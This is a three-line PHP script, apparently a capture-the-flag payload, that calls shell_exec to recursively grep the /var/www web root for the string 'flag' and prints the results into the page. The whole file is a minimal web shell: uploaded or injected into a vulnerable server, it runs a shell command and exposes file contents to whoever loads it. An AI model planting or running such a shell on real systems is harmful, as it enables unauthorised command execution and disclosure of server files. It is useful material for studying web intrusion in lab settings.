<?php
$output = shell_exec("grep -rn '/var/www' -e 'flag'"); 
echo "<pre>$output</pre>";
?>